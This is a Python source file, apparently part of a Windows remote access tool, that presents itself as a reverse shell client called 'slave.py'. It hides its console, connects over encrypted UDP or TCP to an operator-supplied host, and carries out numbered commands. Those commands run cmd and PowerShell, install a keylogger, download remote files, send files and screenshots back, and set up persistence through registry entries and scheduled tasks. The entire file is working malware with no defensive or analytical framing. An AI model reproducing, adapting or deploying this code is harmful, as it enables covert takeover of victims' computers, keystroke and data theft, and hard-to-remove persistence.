############################################################################
#
#   slave.py (reverse shell) [ Main Program ]
#   © 2022 ABDULKADİR GÜNGÖR All Rights Reserved
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	04/2022
#	All Rights Reserved (Tüm Hakları Saklıdır)
#
############################################################################
from  ghostlib_win32socket import Win32Socket
from  ghostlib_win32crypto import Win32Crypto
from ghostlib_win32keyloggercreate import keylogger_create
from  ghostlib_win32functions import *
import  sys

#
class Settings:
    CRTYPTO_KEY     =  b'A45iPxLo908RYe3Wq034TueWvCxz3618'      # 32 bit(s)
    CRTYPTO_NUMBER  =  71                                       # 0 < x < 128
    SOCKET_PROTOCOL = "UDP"                                     # "TCP" or "UDP"
    SOCKET_HOST     = "127.0.0.1"
    SOCKET_PORT     = 9292
    SYSTEM_ENCODE   = "cp857"                                    # TURKISH CHARACTER SET
    SYSTEM_DEFAULTTIMEOUT = 300                                  #

#
#
def arg():
    argv = sys.argv
    number = len(argv)
    #
    try:
        for ii in range(number):
            if ii != 0:
                if argv[ii].lower() == "-h" or argv[ii].lower() == "-help" :
                    raise TypeError("Help error!")
                elif argv[ii].lower() == "-udp":
                    Settings.SOCKET_PROTOCOL = "UDP"
                elif argv[ii].lower() == "-tcp":
                    Settings.SOCKET_PROTOCOL = "TCP"
                elif len(argv[ii]) > 4 and argv[ii][0:3].lower() == "-t:":
                    Settings.SYSTEM_DEFAULTTIMEOUT = int(argv[ii][3:])
                elif len(argv[ii]) > 4 and argv[ii][0:3].lower() == "-c:":
                    Settings.SYSTEM_ENCODE = argv[ii][3:]
                else:
                    if argv[ii].find(":") == -1:
                        Settings.SOCKET_HOST = argv[ii]
                    else:
                        nn = argv[ii].find(":")
                        Settings.SOCKET_HOST = argv[ii][:nn]
                        Settings.SOCKET_PORT = int(argv[ii][nn+1:])
    except:
        print()
        print("\t\t Argument(s) ")
        print("\t-------------------------------")
        print("\tProtocol argument: -udp/-tcp  ")
        print("\tTimeout  argument: -t:00 ")
        print("\tSystem encode: -c:cp857")
        print("\tHost-port    :  127.0.0.1:9090")
        print()
        print()
        print("\t(Examples)")
        print("\t{} 1.1.1.1:8989 -udp -c:utf-8 -t:30 ".format(argv[00]))
        print("\t{} -tcp 2.3.3.3:7070 -c:cp857  ".format(argv[00]))
        print("\t{} 2.3.3.3:7070 ".format(argv[00]))
        print()
        sys.exit(0)

#
def command(cmd,s):
    iserror_bool = True
    res_byte = b'Error!'
    #
    #
    try:
        if cmd != b' ' and cmd != b'Continue' and cmd != b'Exit':
            if len(cmd) >= 3:
                if cmd[0:3] == b'01:':
                    f1_console_hide()
                    iserror_bool = False
                    res_byte=b'Console has been hidden!'
                elif cmd[0:3] == b'02:':
                    f1_console_show()
                    iserror_bool = False
                    res_byte=b'Console has been shown!'
                elif cmd[0:3] == b'03:':
                    f1_console_show()
                    print(bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace"))
                    iserror_bool = False
                    res_byte=b'Message has been shown!'
                elif cmd[0:3] == b'04:':
                    try:
                        keylogger_create( bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace") )
                        iserror_bool = False
                        res_byte=b'Keylogger has been created!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'05:':
                    try:
                        f8_start( bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace") )
                        iserror_bool = False
                        res_byte=b'Program has been started!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'06:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        fname = tmp[0].strip()
                        furl  = tmp[1].strip()
                        f6_url_download(furl, fname)
                        iserror_bool = False
                        res_byte=b'File has been started downloading!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'07:':
                    try:
                        a, b = f12_run_cmd( cmd[3:], encode=Settings.SYSTEM_ENCODE )
                        if a:
                            iserror_bool = a
                            res_byte = b'Error!'
                        else:
                            iserror_bool = a
                            res_byte= b
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'08:':
                    try:
                        a, b = f11_run_powershell( cmd[3:], encode=Settings.SYSTEM_ENCODE )
                        if a:
                            iserror_bool = a
                            res_byte = b'Error!'
                        else:
                            iserror_bool = a
                            res_byte= b
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'09:':
                    try:
                        a, b = f13_system_info(encode=Settings.SYSTEM_ENCODE)
                        if a:
                            iserror_bool = a
                            res_byte = b'Error!'
                        else:
                            iserror_bool = a
                            res_byte= b
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'10:':
                    try:
                        a = f2_os_getcwd()
                        res_str   = "Working Directory = " + a
                        res_byte  = res_str.encode(encoding="UTF-8", errors="backslashreplace")
                        iserror_bool = False
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'11:':
                    try:
                        rr = f2_os_setcd(bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace"))
                        if rr:
                            res_byte  = b'Working Directory has been changed!'
                            iserror_bool = False
                        else:
                            res_byte  = b'Error!'
                            iserror_bool = True
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'12:':
                    try:
                        cc = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        dd = cc.split(sep=' ')
                        zip =  dd[0].strip()
                        path = dd[1].strip()
                        rr = f7_zip_create_file(zip, path)
                        if rr:
                            res_byte  = b'Zip has been created!'
                            iserror_bool = False
                        else:
                            res_byte  = b'Error!'
                            iserror_bool = True
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'13:':
                    try:
                        cc = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        dd = cc.split(sep=' ')
                        zip =  dd[0].strip()
                        path = dd[1].strip()
                        rr = f7_zip_create_directory(zip, path)
                        if rr:
                            res_byte  = b'Zip has been created!'
                            iserror_bool = False
                        else:
                            res_byte  = b'Error!'
                            iserror_bool = True
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'14:':
                    try:
                        cc = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        dd = cc.split(sep=' ')
                        if len(dd) == 1:
                            zip = dd[0].strip()
                            path = f2_os_getcwd()
                        else:
                            zip =  dd[0].strip()
                            path = dd[1].strip()
                        rr = f7_zip_extract(zip,path)
                        if rr:
                            res_byte  = b'Zip has been extracted!'
                            iserror_bool = False
                        else:
                            res_byte  = b'Error!'
                            iserror_bool = True
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'15:':
                    try:
                        path = f2_os_getcwd()
                        if len(cmd) > 3:
                            path = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        r1, r2 = f4_dir(path)
                        if r1:
                           res_byte = r2.encode(encoding="UTF-8", errors="backslashreplace")
                           iserror_bool = False
                        else:
                            res_byte = b'Error!'
                            iserror_bool = True
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'16:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        old = tmp[0].strip()
                        new  = tmp[1].strip()
                        rr = f5_rename_file_directory(old, new)
                        if rr:
                            iserror_bool = False
                            res_byte=b'File has been renamed!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'17:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        old = tmp[0].strip()
                        new  = tmp[1].strip()
                        rr = f5_rename_file_directory(old, new)
                        if rr:
                            iserror_bool = False
                            res_byte=b'File has been moved!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'18:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        rr = f5_delete_file(pp)
                        if rr:
                            iserror_bool = False
                            res_byte=b'File has been deleted!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'19:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        old = tmp[0].strip()
                        new  = tmp[1].strip()
                        rr = f5_rename_file_directory(old, new)
                        if rr:
                            iserror_bool = False
                            res_byte=b'Directory has been renamed!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'20:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        rr = f3_cd_create(pp)
                        if rr:
                            iserror_bool = False
                            res_byte=b'Directory has been created!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'21:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        rr = f3_cd_delete(pp)
                        if rr:
                            iserror_bool = False
                            res_byte=b'Directory has been deleted!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'22:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        second = tmp[0].strip()
                        program  = tmp[1].strip()
                        f18_repeatProgram( int(second), program )
                        iserror_bool = False
                        res_byte=b'The program is set to run repetitively!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'23:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        reg_name = tmp[0].strip()
                        program  = tmp[1].strip()
                        directory = tmp[2].strip()
                        rr = f9_persistent_regedit(reg_name, program, directory)
                        if rr:
                            iserror_bool = False
                            res_byte=b'Regedit has been created!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'24:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        rr = f9_remove_regedit( pp.strip() )
                        if rr:
                            iserror_bool = False
                            res_byte=b'Regedit has been deleted!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'25:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        task_name = tmp[0].strip()
                        program  = tmp[1].strip()
                        tt = tmp[2].strip()
                        rr = f10_create_sctasks_minute( task_name, program, int(tt) )
                        if rr:
                            iserror_bool = False
                            res_byte=b'Sctasks has been created!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'26:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        task_name = tmp[0].strip()
                        program  = tmp[1].strip()
                        tt = tmp[2].strip()
                        rr = f10_create_sctasks_hourly( task_name, program, int(tt) )
                        if rr:
                            iserror_bool = False
                            res_byte=b'Sctasks has been created!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'27:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        task_name = tmp[0].strip()
                        program  = tmp[1].strip()
                        tt = tmp[2].strip()
                        rr = f10_create_sctasks_daily( task_name, program, tt )
                        if rr:
                            iserror_bool = False
                            res_byte=b'Sctasks has been created!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'28:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.split(sep=' ')
                        task_name = tmp[0].strip()
                        program  = tmp[1].strip()
                        tt = tmp[2].strip()
                        rr = f10_create_sctasks_once( task_name, program, tt )
                        if rr:
                            iserror_bool = False
                            res_byte=b'Sctasks has been created!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'29:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.strip()
                        rr = f10_disable_schtasks(tmp)
                        if rr:
                            iserror_bool = False
                            res_byte=b'Sctasks has been disabled'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'30:':
                    try:
                        pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                        tmp = pp.strip()
                        rr = f10_delete_schtasks(tmp)
                        if rr:
                            iserror_bool = False
                            res_byte=b'Sctasks has been deleted!'
                        else:
                            iserror_bool = True
                            res_byte = b'Error!'
                    except:
                        iserror_bool = True
                        res_byte = b'Error!'
                elif cmd[0:3] == b'31:':
                    pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                    tmp = pp.strip()
                    notError, filename,  size , md5 , sha1, sha258, sha512 = f14_check_file(tmp)
                    #
                    if notError:
                        d1 = filename + " " + str(size) + " " + md5 + " " + sha1 + " " + sha258 + " " + sha512
                        d1_bytes = b'70:' + d1.encode(encoding="UTF-8", errors="backslashreplace")
                        #
                        s.send( d1_bytes )
                        s.send(b"\tOK!...")
                        #
                        turn = True
                        offset = 0
                        while turn:
                            x1, offset , tmp_data = f14_file_read(filename,offset)
                            if x1:
                                dd = b'72:' + tmp_data
                                s.send(dd)
                                s.send(b"\tOK!...")
                            else:
                                dd = b'71:'
                                s.send(dd)
                                s.send(b"\tOK!...")
                                turn=False
                        #
                        iserror_bool = False
                        res_byte =  b"\tFile has been transfered!"
                    #
                    #
                    else:
                        s.send(b'71:')
                        s.send(b"\tOK!...")
                        #
                        iserror_bool = True
                        res_byte =  b"File has not been found!"
                #
                elif cmd[0:3] == b'32:':
                    pp = bytes.decode(cmd[3:], encoding="UTF-8", errors="backslashreplace")
                    filename = pp.strip()
                    #
                    #
                    turn = True
                    while turn:
                        s.send(b"\tOK!...")
                        dd = s.send(b"\tOK!...")
                        if dd[0:3] == b'72:':
                            f14_file_write(filename, dd[3:])
                        else:
                            if dd[0:3] == b'71:':
                                s.send(dd)
                                s.send(b"\tOK!...")
                            turn = False
                    #
                    #
                    notError, filename, size, md5, sha1, sha258, sha512 = f14_check_file(filename)
                    if notError:
                        d1 = filename + " " + str(size) + " " + md5 + " " + sha1 + " " + sha258 + " " + sha512
                        d1_bytes = b'70:' + d1.encode(encoding="UTF-8", errors="backslashreplace")
                    else:
                        d1 = "Error" + " " + str(0) + " " + "Error"+ " " + "Error"+ " " + "Error" + " " + "Error"
                        d1_bytes = b'70:' + d1.encode(encoding="UTF-8", errors="backslashreplace")
                    #
                    s.send(d1_bytes)
                    s.send(b"\tOK!...")
                    #
                    #
                    iserror_bool = False
                    res_byte =  b"\tFile has been transfered!"
                #
                elif cmd[0:3] == b'33:':
                    res, data = f16_screenshot_to_bytes()
                    #
                    if res:
                        size = len(data)
                        buffer=1024 * 10
                        #
                        for ii in range(0, size, buffer):
                            hh = b'72:' + data[ii:ii+buffer]
                            s.send(hh)
                            s.send(b"\tOK!...")
                    else:
                        dd = b'71:'
                        s.send(dd)
                        s.send(b"\tOK!...")
                    #
                    #
                    iserror_bool = False
                    res_byte =  b"\tScreenshot has been shown!"
                elif cmd[0:3] == b'34:':
                    res, data = f16_screenshot_to_bytes()
                    #
                    if res:
                        size = len(data)
                        buffer=1024 * 10
                        #
                        for ii in range(0, size, buffer):
                            hh = b'72:' + data[ii:ii+buffer]
                            s.send(hh)
                            s.send(b"\tOK!...")
                    else:
                        dd = b'71:'
                        s.send(dd)
                        s.send(b"\tOK!...")
                    #
                    #
                    iserror_bool = False
                    res_byte =  b"\tScreenshot has been saved!"
                #
                #
                #
                elif cmd[0:3] == b'99:':
                    iserror_bool = False
                    res_byte =  b"\tOK!..."
            #
            #
            #
            elif cmd[0:3] == b'99:':
                iserror_bool = False
                res_byte = b"\tOK!..."
        #
        else:
            res_byte = cmd
            iserror_bool = False
    #
    #
    except:
        pass
    #
    #
    return iserror_bool, res_byte


#
if __name__ == '__main__':
    arg()
    f1_console_hide()
    #
    #
    password = Win32Crypto(key=Settings.CRTYPTO_KEY, number=Settings.CRTYPTO_NUMBER)
    s = Win32Socket(win32crypto=password, protocol=Settings.SOCKET_PROTOCOL, host=Settings.SOCKET_HOST, port=Settings.SOCKET_PORT)

    while True:
        #
        s.start(settimeout=Settings.SYSTEM_DEFAULTTIMEOUT)
        #
        try:
            if s.connection == True and not s.iserror:
                #
                cmd = s.send(b"\tOK!...")
                #
                if cmd is not None:
                    while True:
                        #
                        if cmd == b'Exit':
                            cmd = s.send(b"\tOK!...")
                            s.close()
                            sys.exit(0)
                        #
                        a, b = command(cmd, s)
                        if a:
                            res = b'Error!'
                        else:
                            res = b
                        #
                        cmd = s.send( res )
                        if res==b' ' or s.connection == False or s.iserror:
                            break
                        #
                        cmd = s.send(b"\tOK!...")
                        if res==b' ' or s.connection == False or s.iserror:
                            break
                        #
        except:
            break